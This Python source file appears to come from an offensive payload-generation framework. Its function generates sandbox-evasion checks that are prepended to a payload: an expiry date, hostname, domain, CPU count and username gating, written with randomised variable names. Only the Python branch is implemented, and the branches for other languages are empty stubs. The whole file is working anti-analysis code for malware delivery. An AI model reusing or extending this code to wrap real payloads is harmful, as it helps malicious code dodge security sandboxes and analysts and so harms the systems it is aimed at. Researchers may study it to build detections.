'''
This file contains the payload sandbox checks for each respective language
'''

from datetime import date
from datetime import timedelta
from Tools.Evasion.evasion_common import evasion_helpers


def senecas_games(evasion_payload):
    # Start checks to determine language
    # Define original values of variables
    num_tabs_required = 0
    check_code = ''

    if evasion_payload.language == 'python':
        if evasion_payload.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":

            RandToday = evasion_helpers.randomString()
            RandExpire = evasion_helpers.randomString()

            todaysdate = date.today()
            expiredate = str(todaysdate + timedelta(days=int(evasion_payload.required_options["EXPIRE_PAYLOAD"][0])))

            # Create Payload code
            check_code += '\t' * num_tabs_required + 'from datetime import datetime\n'
            check_code += '\t' * num_tabs_required + 'from datetime import date\n'
            check_code += '\t' * num_tabs_required + RandToday + ' = datetime.now()\n'
            check_code += '\t' * num_tabs_required + RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
            check_code += '\t' * num_tabs_required + 'if ' + RandToday + ' < ' + RandExpire + ':\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["HOSTNAME"][0].lower() != "x":

            rand_hostname = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'import platform\n'
            check_code += '\t' * num_tabs_required + rand_hostname + ' = platform.node()\n'
            check_code += '\t' * num_tabs_required + 'if \"' + evasion_payload.required_options["HOSTNAME"][0].lower() + '\" in ' + rand_hostname + '.lower():\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["DOMAIN"][0].lower() != "x":

            rand_domain = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'import socket\n'
            check_code += '\t' * num_tabs_required + rand_domain + ' = socket.getfqdn()\n'
            check_code += '\t' * num_tabs_required + 'if \"' + evasion_payload.required_options["DOMAIN"][0].lower() + '\" in ' + rand_domain + '.lower():\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["PROCESSORS"][0].lower() != "x":

            rand_processor_count = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'import multiprocessing\n'
            check_code += '\t' * num_tabs_required + rand_processor_count + ' = multiprocessing.cpu_count()\n'
            check_code += '\t' * num_tabs_required + 'if ' + rand_processor_count + ' >= ' + evasion_payload.required_options["PROCESSORS"][0] + ':\n'

            # Add a tab for this check
            num_tabs_required += 1

        if evasion_payload.required_options["USERNAME"][0].lower() != "x":

            rand_user_name = evasion_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'import getpass\n'
            check_code += '\t' * num_tabs_required + rand_user_name + ' = getpass.getuser()\n'
            check_code += '\t' * num_tabs_required + 'if \'' + evasion_payload.required_options["USERNAME"][0].lower() + '\' in ' + rand_user_name + '.lower():\n'

            # Add a tab for this check
            num_tabs_required += 1

        # Return check information
        return check_code, num_tabs_required

    elif evasion_payload.language == 'ruby':
        pass
    elif evasion_payload.language == 'perl':
        pass
    elif evasion_payload.language == 'powershell':
        pass
    elif evasion_payload.language == 'cs':
        pass
    elif evasion_payload.language == 'go':
        pass
    else:
        return '', 0
